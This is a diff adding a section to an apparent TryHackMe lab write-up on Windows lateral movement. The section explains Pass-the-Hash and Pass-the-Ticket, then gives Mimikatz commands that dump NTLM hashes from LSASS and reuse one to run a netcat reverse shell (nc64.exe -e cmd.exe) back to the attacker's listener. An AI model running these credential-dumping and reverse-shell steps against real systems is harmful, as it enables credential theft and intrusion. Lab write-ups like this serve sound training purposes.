@@ -1069,11 +1069,67 @@ And then in our newly spawned shell:
 
 ```
 C:\Windows\system32>cd C:\Users\t1_corine.waters\Desktop
-cd C:\Users\t1_corine.waters\Desktop
-
 C:\Users\t1_corine.waters\Desktop>Flag.exe
-Flag.exe
 THM{****REDACTED****}
 ```
 
+In Windows networks, authentication can occur without direct knowledge of a user’s password due to the way NTLM and Kerberos protocols function. This is exploited using techniques such as Pass-the-Hash (PtH) and Pass-the-Ticket (PtT), which leverage extracted credentials from a compromised host to authenticate as another user. The module explores these attack methods using Mimikatz as the primary credential extraction tool.
 
+NTLM authentication relies on challenge-response mechanisms where the password hash, rather than the plaintext password, is used for verification. Attackers can extract NTLM hashes from a machine’s SAM database (for local users) or from LSASS memory (for both local and domain users). If NTLM authentication is enabled, these hashes can be directly reused for authentication via PtH without cracking them. This attack is executed using Mimikatz by injecting the extracted hash into a new process, effectively impersonating the victim user. Linux tools such as xfreerdp, psexec.py, and evil-winrm also support PtH for remote access.
+
+Kerberos authentication uses encrypted tickets instead of password hashes for access control. A Ticket Granting Ticket (TGT) is issued by the Key Distribution Center (KDC) and can be used to request service-specific Ticket Granting Service (TGS) tickets. If an attacker extracts these tickets from LSASS memory using Mimikatz, they can inject them into their session to impersonate a valid user, a technique known as PtT. This allows access to services without needing the actual password. The klist command can be used to verify injected tickets.
+
+This technique is similar to PtH but applies to Kerberos. Instead of NTLM hashes, attackers use Kerberos encryption keys (RC4, AES128, or AES256) to request a TGT from the KDC. These keys can be extracted from memory using Mimikatz and used to launch a shell as the victim user. If RC4 is enabled, the NTLM hash itself functions as a Kerberos key, allowing for Overpass-the-Hash (OPtH) attacks.
+
+By leveraging these authentication weaknesses, attackers can move laterally across a network, gaining higher privileges and deeper access to sensitive systems. These techniques highlight the risks of stored credentials in memory and the importance of enforcing security measures such as Kerberos-only authentication, disabling NTLM, and regularly clearing credential caches.
+
+Let's get to work:
+
+```shell
+ssh za\\t2_felicia.dean@10.200.71.249
+```
+
+Let's run `mimikatz` from `C:\tools\mimikatz.exe`:
+
+```cmd
+C:\tools\mimikatz.exe
+```
+
+Now the following mimikatz commands:
+
+```
+# privilege::debug
+# token::elevate
+# sekurlsa::msv
+```
+
+This will give us debug privileges and dump NTLM hashes. Now we will need to navigate a hash for any Domain user. So any user whose Domain is `ZA`. After that copy the NTLM hash and use it in the following way:
+
+```
+# token::revert
+# sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /ntlm:bfbd9f1d0398493e7f6288f3ff14e7e9 /run:"C:\tools\nc64.exe -e cmd.exe 10.50.65.56 9233"
+```
+```
+└──╼ $nc -lvnp 9233
+listening on [any] 9233 ...
+connect to [10.50.65.56] from (UNKNOWN) [10.200.71.249] 56039
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+```
+
+Now that we received the shell, we can use `winrs.exe` to connect to THMIIS as `t1_toby.beck`:
+
+```
+winrs.exe -r:THMIIS.za.tryhackme.com cmd
+```
+
+Now let's retrieve the flag:
+
+```
+dir C:\Users\t1_toby.beck\Desktop
+C:\Users\t1_toby.beck\Desktop\Flag.exe
+```
+
+There's our Flag!
